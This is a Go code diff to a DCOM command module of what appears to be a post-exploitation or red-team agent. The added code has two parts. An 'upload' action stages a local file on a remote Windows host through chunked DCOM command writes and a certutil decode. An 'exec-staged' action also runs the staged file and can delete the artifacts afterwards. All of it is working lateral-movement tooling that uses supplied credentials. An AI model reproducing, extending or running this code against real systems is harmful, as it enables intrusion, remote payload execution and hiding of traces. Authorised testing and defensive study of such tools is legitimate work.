@@ -29,16 +29,20 @@ func (c *DcomCommand) Description() string {
 }
 
 type dcomArgs struct {
-	Action   string `json:"action"`
-	Host     string `json:"host"`
-	Object   string `json:"object"`
-	Command  string `json:"command"`
-	Args     string `json:"args"`
-	Dir      string `json:"dir"`
-	Username string `json:"username"`
-	Password string `json:"password"`
-	Domain   string `json:"domain"`
-	Timeout  int    `json:"timeout"`
+	Action     string `json:"action"`
+	Host       string `json:"host"`
+	Object     string `json:"object"`
+	Command    string `json:"command"`
+	Args       string `json:"args"`
+	Dir        string `json:"dir"`
+	Username   string `json:"username"`
+	Password   string `json:"password"`
+	Domain     string `json:"domain"`
+	Timeout    int    `json:"timeout"`
+	LocalPath  string `json:"local_path"`
+	RemotePath string `json:"remote_path"`
+	Method     string `json:"method"`
+	Cleanup    bool   `json:"cleanup"`
 }
 
 // DCOM COM object CLSIDs
@@ -121,21 +125,28 @@ func (c *DcomCommand) Execute(task structs.Task) structs.CommandResult {
 		args.Timeout = 120
 	}
 
+	var fn func() structs.CommandResult
 	switch strings.ToLower(args.Action) {
 	case "exec":
-		// Run with timeout protection to prevent agent hangs on unreachable targets
-		ch := make(chan structs.CommandResult, 1)
-		go func() {
-			ch <- dcomExec(args)
-		}()
-		select {
-		case r := <-ch:
-			return r
-		case <-time.After(time.Duration(args.Timeout) * time.Second):
-			return errorf("DCOM operation timed out after %ds — target %s may be unreachable", args.Timeout, args.Host)
-		}
+		fn = func() structs.CommandResult { return dcomExec(args) }
+	case "upload":
+		fn = func() structs.CommandResult { return dcomUpload(args) }
+	case "exec-staged":
+		fn = func() structs.CommandResult { return dcomExecStaged(args) }
 	default:
-		return errorf("Unknown action: %s\nAvailable: exec", args.Action)
+		return errorf("Unknown action: %s\nAvailable: exec, upload, exec-staged", args.Action)
+	}
+
+	// Run with timeout protection to prevent agent hangs on unreachable targets
+	ch := make(chan structs.CommandResult, 1)
+	go func() {
+		ch <- fn()
+	}()
+	select {
+	case r := <-ch:
+		return r
+	case <-time.After(time.Duration(args.Timeout) * time.Second):
+		return errorf("DCOM operation timed out after %ds — target %s may be unreachable", args.Timeout, args.Host)
 	}
 }
 
@@ -311,4 +322,116 @@ func createRemoteCOM(host string, clsid *ole.GUID, domain, username, password st
 	}
 
 	return disp, authState, nil
+}
+
+// dcomRunCmd is a helper that executes a single command via DCOM and returns success/failure.
+func dcomRunCmd(args dcomArgs, command string) bool {
+	execArgs := args
+	execArgs.Command = command
+	result := dcomExec(execArgs)
+	return (result.Status == "success")
+}
+
+// dcomUpload stages a local file on the remote host via DCOM command execution.
+func dcomUpload(args dcomArgs) structs.CommandResult {
+	if args.LocalPath == "" {
+		return errorResult("Error: local_path is required (file to upload from agent filesystem)")
+	}
+	if args.Host == "" {
+		return errorResult("Error: host is required (remote target)")
+	}
+
+	method := parseStagingMethod(args.Method)
+	plan, err := planStaging(args.LocalPath, args.RemotePath, method)
+	if err != nil {
+		return errorf("Error planning staging: %v", err)
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("Staging file to %s via DCOM (%s):\n", args.Host, args.Object))
+	sb.WriteString(fmt.Sprintf("  Source:      %s\n", args.LocalPath))
+	sb.WriteString(fmt.Sprintf("  Destination: %s\n", plan.RemotePath))
+	sb.WriteString(fmt.Sprintf("  Method:      %s\n", args.Method))
+	sb.WriteString(fmt.Sprintf("  Commands:    %d write + %d decode\n\n", len(plan.WriteCommands), boolToInt(plan.DecodeCommand != "")))
+
+	for i, cmd := range plan.WriteCommands {
+		if !dcomRunCmd(args, cmd) {
+			return errorf("Error on write chunk %d/%d", i+1, len(plan.WriteCommands))
+		}
+		sb.WriteString(fmt.Sprintf("  [%d/%d] Write chunk OK\n", i+1, len(plan.WriteCommands)))
+	}
+
+	if plan.DecodeCommand != "" {
+		if !dcomRunCmd(args, plan.DecodeCommand) {
+			return errorResult("Error decoding staged file via certutil")
+		}
+		sb.WriteString("  Decode OK\n")
+	}
+
+	sb.WriteString(fmt.Sprintf("\nFile staged at: %s\n", plan.RemotePath))
+	return successResult(sb.String())
+}
+
+// dcomExecStaged uploads a file, executes it, and optionally cleans up via DCOM.
+func dcomExecStaged(args dcomArgs) structs.CommandResult {
+	if args.LocalPath == "" {
+		return errorResult("Error: local_path is required (file to stage and execute)")
+	}
+	if args.Host == "" {
+		return errorResult("Error: host is required (remote target)")
+	}
+
+	method := parseStagingMethod(args.Method)
+	plan, err := planStaging(args.LocalPath, args.RemotePath, method)
+	if err != nil {
+		return errorf("Error planning staging: %v", err)
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("Staged execution on %s via DCOM (%s):\n", args.Host, args.Object))
+	sb.WriteString(fmt.Sprintf("  Source:  %s\n", args.LocalPath))
+	sb.WriteString(fmt.Sprintf("  Remote:  %s\n", plan.RemotePath))
+	sb.WriteString(fmt.Sprintf("  Method:  %s\n\n", args.Method))
+
+	// Phase 1: Stage
+	sb.WriteString("--- Phase 1: Staging ---\n")
+	for i, cmd := range plan.WriteCommands {
+		if !dcomRunCmd(args, cmd) {
+			return errorf("Staging failed on chunk %d/%d", i+1, len(plan.WriteCommands))
+		}
+		sb.WriteString(fmt.Sprintf("  [%d/%d] Write OK\n", i+1, len(plan.WriteCommands)))
+	}
+
+	if plan.DecodeCommand != "" {
+		if !dcomRunCmd(args, plan.DecodeCommand) {
+			for _, cmd := range plan.CleanupCommands {
+				dcomRunCmd(args, cmd)
+			}
+			return errorResult("Decode failed — cleaned up staging artifacts")
+		}
+		sb.WriteString("  Decode OK\n")
+		dcomRunCmd(args, fmt.Sprintf(`cmd.exe /c del /f /q "%s.b64"`, plan.RemotePath))
+	}
+
+	// Phase 2: Execute
+	sb.WriteString("\n--- Phase 2: Execution ---\n")
+	execCmd := plan.RemotePath
+	if args.Command != "" {
+		execCmd = fmt.Sprintf(`%s %s`, plan.RemotePath, args.Command)
+	}
+	dcomRunCmd(args, execCmd)
+	sb.WriteString(fmt.Sprintf("  Executed: %s\n", execCmd))
+
+	// Phase 3: Cleanup
+	if args.Cleanup {
+		sb.WriteString("\n--- Phase 3: Cleanup ---\n")
+		for _, cmd := range plan.CleanupCommands {
+			dcomRunCmd(args, cmd)
+		}
+		sb.WriteString("  Artifacts removed\n")
+	} else {
+		sb.WriteString(fmt.Sprintf("\n  File remains at %s (use cleanup=true to auto-remove)\n", plan.RemotePath))
+	}
+
+	return successResult(sb.String())
 }
